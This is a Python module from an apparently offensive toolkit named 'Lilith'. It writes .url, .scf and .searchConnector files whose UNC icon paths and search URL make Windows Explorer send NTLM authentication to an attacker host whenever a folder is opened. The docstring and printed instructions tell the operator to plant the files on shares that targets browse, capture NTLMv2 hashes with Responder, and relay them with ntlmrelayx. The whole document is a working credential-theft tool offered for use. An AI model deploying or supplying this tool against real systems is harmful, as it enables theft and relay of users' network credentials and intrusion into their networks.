"""
Lilith — NTLM trigger file generator

Drop these files on any share/folder the target will browse in Explorer.
The moment Explorer renders the folder, it fetches the icon via UNC path,
triggering NTLM authentication to lhost — no user interaction required.

Files generated (@ prefix sorts them to top of directory listing):
  @trigger.url               — Internet Shortcut w/ UNC IconFile
  @trigger.scf               — Shell Command File w/ UNC IconFile
  @trigger.searchConnector   — Search Connector XML (auto-auth on folder open)

Capture hashes:
  python3 Responder.py -I eth0 -wrf

Relay to SMB/LDAP (disable SMB in Responder first):
  python3 ntlmrelayx.py -tf targets.txt -smb2support [-l loot/]
  python3 ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -6

Responder path (Kali): /usr/share/responder/Responder.py
ntlmrelayx path (Kali): /usr/share/doc/python3-impacket/examples/ntlmrelayx.py
"""

import os


def _url_file(lhost: str) -> str:
    return (
        "[InternetShortcut]\r\n"
        f"URL=file://{lhost}/share\r\n"
        f"IconFile=\\\\{lhost}\\share\\icon.ico\r\n"
        "IconIndex=0\r\n"
        "HotKey=0\r\n"
    )


def _scf_file(lhost: str) -> str:
    return (
        "[Shell]\r\n"
        "Command=2\r\n"
        f"IconFile=\\\\{lhost}\\share\\icon.ico\r\n"
        "[Taskbar]\r\n"
        "Command=ToggleDesktop\r\n"
    )


def _search_connector(lhost: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\r\n'
        '<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">\r\n'
        '  <description>Windows Search</description>\r\n'
        '  <isSearchOnly>false</isSearchOnly>\r\n'
        '  <locationProvider clsid="{14be5a1d-f2c5-4b6b-9e9e-4b8d63a4e527}">\r\n'
        '    <propertyBag>\r\n'
        f'      <property name="OpenSearchURL">http://{lhost}/search?q={{searchTerms}}</property>\r\n'
        '      <property name="MaximumResultCount" type="uint32">100</property>\r\n'
        '    </propertyBag>\r\n'
        '  </locationProvider>\r\n'
        '</searchConnectorDescription>\r\n'
    )


def build_ntlm_triggers(lhost: str, output_dir: str) -> bool:
    """Generate NTLM trigger files that auto-authenticate to lhost when browsed."""
    os.makedirs(output_dir, exist_ok=True)

    files = [
        ("@trigger.url",               _url_file(lhost)),
        ("@trigger.scf",               _scf_file(lhost)),
        ("@trigger.searchConnector",   _search_connector(lhost)),
    ]

    for filename, content in files:
        path = os.path.join(output_dir, filename)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"[+] {path}")

    print()
    print(f"[*] Drop all files in a share/folder the target will browse in Explorer")
    print(f"    @ prefix ensures they appear first in the directory listing")
    print()
    print(f"[*] Capture NTLMv2 hashes:")
    print(f"    python3 Responder.py -I eth0 -wrf")
    print()
    print(f"[*] Relay (SMB signing disabled on target required):")
    print(f"    # First: comment out SMB = On in Responder.conf")
    print(f"    python3 ntlmrelayx.py -tf targets.txt -smb2support")
    print()
    print(f"[*] lhost used in UNC paths: {lhost}")
    print(f"    Make sure port 445 (SMB) is reachable from target to lhost")
    print(f"    Use Responder for capture — it handles SMB/HTTP/NTLMv2 automatically")

    return True
